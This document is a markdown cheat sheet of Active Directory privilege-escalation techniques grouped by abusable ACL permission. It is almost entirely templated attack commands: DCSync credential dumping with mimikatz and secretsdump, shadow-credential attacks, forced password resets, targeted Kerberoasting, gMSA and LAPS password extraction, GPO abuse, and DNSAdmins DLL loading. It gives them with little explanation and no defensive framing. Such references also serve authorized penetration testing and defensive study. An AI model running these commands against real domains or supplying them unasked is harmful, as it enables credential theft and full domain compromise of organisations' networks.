# ACLs/ACEs permissions

## Dcsync >>> Domain Admin || Lateral move || Crack hash
- Administrators, Domain Admins, or Enterprise Admins as well as Domain Controller computer accounts
- `mimikatz lsadump::dcsync /domain:<target_domain> /user:<target_domain>\administrator`
- `secretsdump.py '<domain>'/'<user>':'<password>'@'<domain_controller>'`

## can change msDS-KeyCredentialLInk (Generic Write) + ADCS >>> PassTheCertificate
- Shadow Credentials
  - `certipy shadow auto '-u <user>@<domain>' -p <password> -account '<target_account>'`
  - `pywhisker.py -d "FQDN_DOMAIN" -u "user1" -p "CERTIFICATE_PASSWORD" --target "TARGET_SAMNAME" --action "list"`

## On Group
- GenericAll/GenericWrite/Self/Add Extended Rights
  - Add member to the group
- Write Owner
  - Grant Ownership
- WriteDACL + WriteOwner
  - Grant rights
    - Give yourself generic all

## On Computer
- GenericAll / GenericWrite
  - msDs-AllowedToActOnBehalf >>> RBCD
  - add Key Credentials >>> shadow credentials

## On User
- GenericAll / GenericWrite
  - Change password
    - `net user <user> <password> /domain` >>> User with clear text pass
  - add SPN (target kerberoasting)
    - `targetedKerberoast.py -d <domain> -u <user> -p <pass>` >>> Hash found (TGS)
  - add key credentials >>> shadow credentials
  - login script >>> Access
- ForceChangePassword
  - `net user <user> <password> /domain` >>> User with clear text pass

## On OU
- Write Dacl
  - ACE Inheritance
    - Grant rights
- GenericAll / GenericWrite / Manage Group Policy Links
  - `OUned.py --config config.ini`

## ReadGMSAPassword
- `gMSADumper.py -u '<user>' -p '<password>' -d '<domain>'`
- `nxc ldap <ip> -u <user> -p <pass> --gmsa`
- `ldeep ldap -u <user> -p <password> -d <domain> -s ldaps://<dc_ip> gmsa`

## Get LAPS passwords
- Who can read LAPS
  - `MATCH p=(g:Base)-[:ReadLAPSPassword]->(c:Computer) RETURN p`
- Read LAPS >>> Admin
  - `Get-LapsADPassword -DomainController <ip_dc> -Credential <domain>\<login> | Format-Table -AutoSize`
  - `ldeep ldap -u <user> -p <password> -d <domain> -s ldap://<dc_ip> laps`
  - `foreach ($objResult in $colResults){$objComputer = $objResult.Properties; $objComputer.name|where {$objcomputer.name -ne $env:computername}|%{foreach-object {Get-AdmPwdPassword -ComputerName $_}}}`
  - `nxc ldap <dc_ip> -d <domain> -u <user> -p <password> --module laps`
  - `msf> use post/windows/gather/credentials/enum_laps`

## GPO
- Who can control GPOs
  - `MATCH p=((n:Base)-[]->(gp:GPO)) RETURN p`
- SID of principals that can create new GPOs in the domain
  - `Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=blah,DC=com" -ResolveGUIDs  | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl`
- Return the principals that can write to the GP-Link attribute on OUs
  - `Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl`
- Generic Write on  GPO
  - Abuse GPO >>> ACCESS

## DNS Admin
- DNSadmins abuse (CVE-2021-40469) @CVE@ >>> Admin
  - `dnscmd.exe /config /serverlevelplugindll <\\path\to\dll> # need a dnsadmin user`
  - `sc \\DNSServer stop dns sc \\DNSServer start dns`
